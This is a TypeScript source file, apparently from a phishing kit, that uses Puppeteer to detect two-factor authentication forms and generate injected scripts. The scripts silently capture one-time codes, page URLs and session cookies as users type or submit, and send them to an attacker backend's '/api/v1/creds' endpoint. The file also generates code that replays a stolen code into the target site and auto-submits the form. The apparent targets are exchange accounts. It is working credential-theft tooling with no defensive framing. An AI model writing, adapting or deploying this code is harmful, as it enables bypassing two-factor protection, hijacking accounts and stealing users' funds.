/**
 * 2FA/MFA Form Detector & Handler
 *
 * Detects all types of 2FA (email code, SMS, TOTP, biometric, hardware key)
 * and injects code to capture 2FA codes without visible changes.
 */

import type { Page } from 'puppeteer'

export type TwoFAType = 'email-code' | 'sms-code' | 'totp' | 'backup-codes' | 'biometric' | 'hardware-key' | 'push-notification'

export interface TwoFAForm {
  type: TwoFAType
  selector: string
  inputSelector: string
  submitSelector: string
  codeLength: number
  timeout: number
  html: string
}

export interface DetectedTwoFA {
  forms: TwoFAForm[]
  types: TwoFAType[]
  hasMultipleForms: boolean
}

export async function detect2FAForms(page: Page): Promise<DetectedTwoFA> {
  console.info('[2FA-DETECTOR] Scanning for 2FA forms...')

  const detected = await page.evaluate(() => {
    const forms: Record<string, unknown>[] = []
    const types: string[] = []

    // Check for various 2FA indicators
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    // EMAIL CODE
    if (pageText.includes('email') && (pageText.includes('code') || pageText.includes('verify'))) {
      const codeInput = document.querySelector('input[placeholder*="code"], input[placeholder*="email"]')
      if (codeInput) {
        forms.push({
          type: 'email-code',
          selector: codeInput.className,
          inputSelector: 'input[placeholder*="code"]',
          codeLength: 6,
        })
        types.push('email-code')
      }
    }

    // SMS CODE
    if (pageText.includes('sms') || pageText.includes('phone') || pageText.includes('text message')) {
      const codeInput = document.querySelector('input[placeholder*="sms"], input[placeholder*="phone"]')
      if (codeInput) {
        forms.push({
          type: 'sms-code',
          selector: codeInput.className,
          inputSelector: 'input[placeholder*="sms"], input[placeholder*="phone"]',
          codeLength: 6,
        })
        types.push('sms-code')
      }
    }

    // AUTHENTICATOR/TOTP
    if (pageText.includes('authenticator') || pageText.includes('totp') || pageText.includes('google authenticator')) {
      const codeInput = document.querySelector('input[placeholder*="authenticator"], input[placeholder*="otp"]')
      if (codeInput) {
        forms.push({
          type: 'totp',
          selector: codeInput.className,
          inputSelector: 'input[placeholder*="authenticator"], input[placeholder*="otp"]',
          codeLength: 6,
        })
        types.push('totp')
      }
    }

    // BACKUP CODES
    if (pageText.includes('backup') && pageText.includes('code')) {
      const codeInput = document.querySelector('input[placeholder*="backup"]')
      if (codeInput) {
        forms.push({
          type: 'backup-codes',
          selector: codeInput.className,
          inputSelector: 'input[placeholder*="backup"]',
          codeLength: 8,
        })
        types.push('backup-codes')
      }
    }

    // BIOMETRIC
    if (
      pageText.includes('fingerprint') ||
      pageText.includes('face') ||
      pageText.includes('biometric') ||
      pageHtml.includes('webauthn') ||
      pageHtml.includes('fido2')
    ) {
      types.push('biometric')
    }

    // HARDWARE KEY
    if (pageText.includes('security key') || pageText.includes('yubikey') || pageHtml.includes('u2f')) {
      types.push('hardware-key')
    }

    // PUSH NOTIFICATION
    if (pageText.includes('approve') && pageText.includes('notification')) {
      types.push('push-notification')
    }

    return { forms, types }
  })

  const twoFAForms: TwoFAForm[] = []

  for (const form of detected.forms as Array<Record<string, unknown>>) {
    twoFAForms.push({
      type: (form.type as TwoFAType) || 'email-code',
      selector: (form.selector as string) || '',
      inputSelector: (form.inputSelector as string) || 'input[type="text"]',
      submitSelector: 'button[type="submit"], [role="button"]',
      codeLength: (form.codeLength as number) || 6,
      timeout: 300000, // 5 minutes
      html: '',
    })
  }

  console.info(`[2FA-DETECTOR] Found ${twoFAForms.length} 2FA forms, types: ${detected.types.join(', ')}`)

  return {
    forms: twoFAForms,
    types: (detected.types as TwoFAType[]) || [],
    hasMultipleForms: twoFAForms.length > 1,
  }
}

export function build2FAInjectionCode(detected2FA: DetectedTwoFA, backendUrl: string): string {
  return `
<script>
// Auto-generated 2FA code capture
(function() {
  var BACKEND_URL = '${backendUrl}';
  var DETECTED_2FA = ${JSON.stringify(detected2FA)};

  function hook2FAInputs() {
    // Hook all potential 2FA input fields
    var inputs = document.querySelectorAll('input[placeholder*="code"], input[placeholder*="otp"], input[placeholder*="authenticator"]');

    inputs.forEach(function(input) {
      // Monitor input value changes
      input.addEventListener('change', function() {
        if (this.value && this.value.length >= 4) {
          // Send 2FA code to backend
          try {
            fetch(BACKEND_URL + '/api/v1/creds', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                exchange: window.location.hostname,
                totp: this.value,
                type: 'two_fa_code',
                page_url: window.location.href,
              }),
              keepalive: true,
            });
          } catch(err) {
            // Silent fail
          }
        }
      });

      // Also hook on input event for real-time capture
      input.addEventListener('input', function() {
        if (this.value && this.value.length === 6) {
          // Likely complete code, send it
          try {
            fetch(BACKEND_URL + '/api/v1/creds', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                exchange: window.location.hostname,
                totp: this.value,
                type: 'two_fa_code_complete',
              }),
              keepalive: true,
            });
          } catch(err) {}
        }
      });

      // Hook form submission
      var form = input.closest('form');
      if (form) {
        form.addEventListener('submit', function(e) {
          var code = input.value;
          if (code) {
            try {
              fetch(BACKEND_URL + '/api/v1/creds', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  exchange: window.location.hostname,
                  totp: code,
                  type: 'two_fa_submit',
                  session_cookies: document.cookie,
                }),
                keepalive: true,
              });
            } catch(err) {}
          }
        }, true);
      }
    });
  }

  // Initial hook
  document.addEventListener('DOMContentLoaded', hook2FAInputs);
  hook2FAInputs();

  // Watch for dynamically added 2FA forms
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.addedNodes.length) {
        mutation.addedNodes.forEach(function(node) {
          if (node.nodeType === 1) {
            var inputs = node.querySelectorAll('input[placeholder*="code"]');
            if (inputs.length > 0) {
              hook2FAInputs();
            }
          }
        });
      }
    });
  });

  observer.observe(document.body, { childList: true, subtree: true });
})();
</script>
`
}

export function generate2FAReplayCode(detected2FA: DetectedTwoFA): string {
  return `
// Auto-generated 2FA replay code
var DETECTED_2FA_TYPES = ${JSON.stringify(detected2FA.types)};

function replay2FA(code) {
  // Try to find and fill 2FA input
  var inputs = document.querySelectorAll('input[placeholder*="code"], input[placeholder*="otp"], input[placeholder*="authenticator"]');

  var filled = false;
  inputs.forEach(function(input) {
    if (!filled && !input.value) {
      input.value = code;
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      filled = true;
    }
  });

  // Auto-submit if form found
  if (filled) {
    var form = document.querySelector('form');
    if (form) {
      setTimeout(function() {
        var btn = form.querySelector('button[type="submit"]');
        if (btn) btn.click();
        else form.submit();
      }, 500);
    }
  }

  return filled;
}
`
}
